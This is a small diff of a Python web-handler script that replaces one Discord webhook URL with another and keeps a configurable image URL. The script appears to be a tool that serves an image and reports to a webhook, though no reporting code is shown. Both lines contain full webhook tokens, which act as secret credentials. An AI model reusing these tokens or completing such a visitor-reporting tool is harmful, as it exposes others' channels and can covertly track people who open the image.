@@ -5,7 +5,7 @@ import json
 from urllib.parse import urlparse, parse_qs
 
 # ================== CONFIG ==================
-WEBHOOK_URL = "https://discord.com/api/webhooks/1490138452640137227/s3epESOyfaOoa3xQ2KDx38Br6bX0skY72_QI3NDluuEB6qXTsymwSCPIfP6XbcDy7CYg"   # ← CHANGE THIS
+WEBHOOK_URL = "https://discord.com/api/webhooks/1490146029503385734/dJHDVdTh11QHFw_ikNw-wpFG3NB8AN02Xl-rGMTn_8ejJxvyTWYyxOhdZ3P3U1tNQ_BV"   # ← CHANGE THIS
 IMAGE_URL   = "https://wallpaperaccess.com/full/2060613.jpg"                                      # ← Change to any image/GIF you want
 
 class handler(BaseHTTPRequestHandler):
